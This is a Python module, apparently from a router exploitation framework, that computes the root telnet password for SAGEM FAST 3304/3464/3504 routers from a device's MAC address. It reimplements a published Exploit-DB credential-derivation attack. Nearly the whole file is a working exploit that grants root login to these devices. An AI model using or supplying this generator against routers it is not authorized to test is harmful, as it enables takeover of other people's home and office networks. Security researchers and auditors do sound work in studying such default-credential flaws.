# Name:SAGEM FAST telnet password generator
# File:fast_telnet_password.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 21.7.2015
# Last modified: 21.7.2015
# Shodan Dork:
# Description: Generates root telnet password for various SAGEM FAST routers
# (Sagem Fast 3304-V1 / 3304-V2 / 3464 / 3504)
# Based on work of Elouafiq Ali https://www.exploit-db.com/exploits/17670/

import core.Misc
import core.io
from interface.messages import print_success, print_error, print_help, print_info
from interface.utils import validate_mac, lookup_mac


class Misc(core.Misc.RextMisc):
    """
Name:SAGEM FAST telnet password generator
File:fast_telnet_password.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 21.7.2015
Description: Generates root telnet password for various SAGEM FAST routers
    (Sagem Fast 3304-V1 / 3304-V2 / 3464 / 3504)
Based on: Work of Elouafiq Ali https://www.exploit-db.com/exploits/17670/

Options:
    Name        Description

    mac         MAC address used as input for telnet password generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("please provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        mac = self.mac
        mac = mac.upper()
        mac = mac.replace("-", "")
        mac = mac.replace(":", "")

        password = [c for c in "00000000"]
        mac = [c.lower() for c in mac]

        password[0] = self.mash(mac[5], mac[11])
        password[1] = self.mash(mac[0], mac[2])
        password[2] = self.mash(mac[10], mac[11])
        password[3] = self.mash(mac[0], mac[9])
        password[4] = self.mash(mac[10], mac[6])
        password[5] = self.mash(mac[3], mac[9])
        password[6] = self.mash(mac[1], mac[6])
        password[7] = self.mash(mac[3], mac[4])
        password = "".join(p for p in password)

        print_success("password generated")
        print("Telnet password for root is: " + password)

    def mash(self, a, b):
        first = min(a, b)
        second = max(a, b)
        if int(second, 16) < 10:
            if int(first, 16)+int(second, 16) <= 9:
                return chr(ord(first)+int(second, 16))
            else:
                return hex(ord(first)+int(second, 16))
        else:
            return chr(ord(second)+int(first, 16))

Misc()
